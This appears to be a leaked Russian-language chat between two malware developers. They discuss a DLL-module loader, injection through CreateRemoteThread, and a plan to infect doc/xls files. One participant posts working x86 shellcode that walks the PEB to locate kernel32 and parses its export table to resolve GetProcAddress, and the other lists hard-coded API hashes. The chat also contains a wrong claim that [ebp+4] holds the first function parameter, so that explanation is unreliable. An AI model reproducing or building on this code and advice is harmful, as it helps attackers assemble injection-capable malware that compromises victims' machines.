[17.09.21 10:41:07] gunz:		привет,сейчас имею лоадер на C с модульной подрузкой через длл,немного разбираюсь в асме,но не представляю,как реализовать экспортируемую функцию,которая будет работать через CreateRemoteThread.Можешь подсказать литературу или поделиться опытом,как вышел на такой уровень?
[17.09.21 10:45:43] ryan:		Если эта функция будет деалться на асме то нужно сделать 2 вещи: 1. Пролог и эпилог функции. Пролог это 3 инструкции: push ebp / mov ebp, esp / sub esp, x  Эти три инструкции идут вначале всех процедур написанных на C. Они формируют стековый кадр, место для хранения локальных переменных используемых в процедуре, и указатель на параметры которые были переданы функции
[17.09.21 10:48:28] ryan:		После пролога указатель на локальные переменные и параметры функции будет храниться в EBP. Например [ebp + 4] - получить первый параметр функции, [ebp - 4] - получить первую локальную переменную.
[17.09.21 10:49:49] ryan:		2. Второе это сохранить все регистры и флаги, так как содержимое их будет испорчено. Сохраняются они вызовами инструкций pushad/pushf вначале и popfd/popad в конце
[17.09.21 10:52:50] ryan:		Про пролог и эпилог функции написано здесь https://docs.microsoft.com/ru-ru/cpp/cpp/considerations-for-writing-prolog-epilog-code?view=msvc-160
[18.09.21 13:03:37] gunz:		благодарен за развернутый ответ,а сам асм ты как учил?
[19.09.21 08:16:02] ryan:		Привет, писал что-нибудь ? Нерасшифрованное сообщение пришло
[19.09.21 08:17:46] gunz:		привет,поблагодарил
[21.09.21 10:12:19] gunz:		привет,ты ведь все еще планируешь реализовать заражение doc/xls?
[21.09.21 10:31:53] ryan:		Привет, да
[21.09.21 10:56:45] gunz:		держи в курсе успехов/неудач,возможно подскажу из своего опыта,тема зря заброшена
[21.09.21 11:03:53] ryan:		Она не заброшена, скоро запощу там кое-какие результаты работы
[16.11.21 11:15:07] gunz:		привет, стукни
[16.11.21 11:15:31] ryan:		Привет
[16.11.21 11:19:50] gunz:		отр все еще не починили?
[16.11.21 11:20:14] ryan:		Вроде работает, сейчас проверю
[16.11.21 11:21:17] gunz:		хотел уточнить у тебя по поводу шеллкода момент
[16.11.21 11:33:38] gunz:		когда писал его, столкнулся с неприятной вещью - получение адресов функций. На данный момент имею 2 вариации. 1 - получения по хэшу только LdrLoadDll и подгрузка через него все дллки, затем получения адреса функций динамически (GetProcAddressWithHash), но там много гемора с передачей параметров в качестве UNICODE_STRING и возьни со строками в целом. Есть второй способ - вызывать функции по hard-coded хэшу из либ, но этот способ не 100-ый,ведь эти значения могут меняться. Каким ты способом пользуешься и почему?
[16.11.21 11:34:52] gunz:		и могут ли и эти 2 хэша отвалиться в другой системе при использовании первого способа? `#define LDRLOADDLL_HASH					0xbdbf9c13
#define LDRGETPROCADDRESS_HASH			0x5ed941b5`
[16.11.21 11:39:32] ryan:		Вот так можно получить адрес kernel32.dll:
```
	mov     	eax,dword [fs:30h]
	mov		eax, [eax + 0Ch]    
	mov		eax, [eax + 14h]    
	mov		eax, [eax]          
	mov		eax, [eax]          
	mov		eax, [eax + 10h]    
```
[16.11.21 11:39:57] ryan:		А это получение функции GetProcAddress. Она на входе получает image base kernel32.dll, полученный только что показанным способом:

```
get_gpa:
	xchg		ecx, eax

	push		ebx
	push		esi

	test		ecx, ecx
	jz		@nothing

	mov		eax, [ecx + 3Ch]        ; e_lfanew
	lea		eax, [eax + ecx + 78h]  ; eax = IMAGE_DATA_DIRECTORY for IMAGE_DIRECTORY_ENTRY_EXPORT

	mov		edx, [eax]              ; edx = VirtualAddress
	lea		eax, [ecx + edx]        ; eax = IMAGE_EXPORT_DIRECTORY

	mov		edx, [eax + 18h]        ; rdx = NumberOfNames ---- size_t offset = offsetof(IMAGE_EXPORT_DIRECTORY, NumberOfNames);
	test		edx, edx
	jz		@nothing

	mov		ebx, [eax + 20h]        ; ebx = AddressOfNames ---- size_t offset = offsetof(IMAGE_EXPORT_DIRECTORY, AddressOfNames);
	lea		ebx, [ecx + ebx]

@@1:
	mov		esi, [ebx]
	lea		esi, [ecx + esi]        ; function name

	cmp		dword [esi], 50746547h          ; GetP
	jnz		@@2
	cmp		dword [esi + 4], 41636f72h      ; rocA
	jnz		@@2
	cmp		dword [esi + 8], 65726464h      ; ddre
	jnz		@@2
	cmp		dword [esi + 11], 00737365h     ; ress\0
	jnz		@@2

	neg		edx
	mov		esi, [eax + 18h]        ; esi = NumberOfNames ---- size_t offset = offsetof(IMAGE_EXPORT_DIRECTORY, NumberOfNames);
	lea		edx, [esi + edx]        ; edx = function index

	mov		esi, [eax + 24h]        ; r10 = AddressOfNameOrdinals ---- size_t offset = offsetof(IMAGE_EXPORT_DIRECTORY, AddressOfNameOrdinals);

	lea		esi, [ecx + esi]
	movzx		edx, word [esi + edx * 2]   ; edx = index in the function table

	mov		esi, [eax + 1Ch]        ; esi = AddressOfFunctions ---- size_t offset = offsetof(IMAGE_EXPORT_DIRECTORY, AddressOfFunctions);
	lea		esi, [ecx + esi]

	mov		esi, [esi + edx * 4]    ; esi = offset of possible func addr

	mov		edx, [eax]              ; edx = VirtualAddress ---- size_t offset = offsetof(IMAGE_DATA_DIRECTORY, VirtualAddress);
	cmp		esi, edx
	jb		@nothing

	mov		ebx, [eax + 4]          ; ebx = Size ---- size_t offset = offsetof(IMAGE_DATA_DIRECTORY, Size);
	add		ebx, edx
	cmp		esi, ebx
	jae		@nothing

	lea		eax, [ecx + esi]        ; Got our func addr!

	pop		esi
	pop		ebx
	ret

@@2:
	add		ebx, 4
	dec		edx
	jnz		@@1

@nothing:
	xor		eax, eax
	pop		esi
	pop		ebx
	ret
```
[16.11.21 11:40:51] ryan:		А после получения функции GetProcAddress уже есть доступ к любой функции из любой DLL
[16.11.21 11:44:53] gunz:		это стандартный способ LoadLibrary + GetProcAddress?
[16.11.21 11:45:53] ryan:		Да, многие пользуются таким способом
[16.11.21 11:54:42] gunz:		в этом и проблема
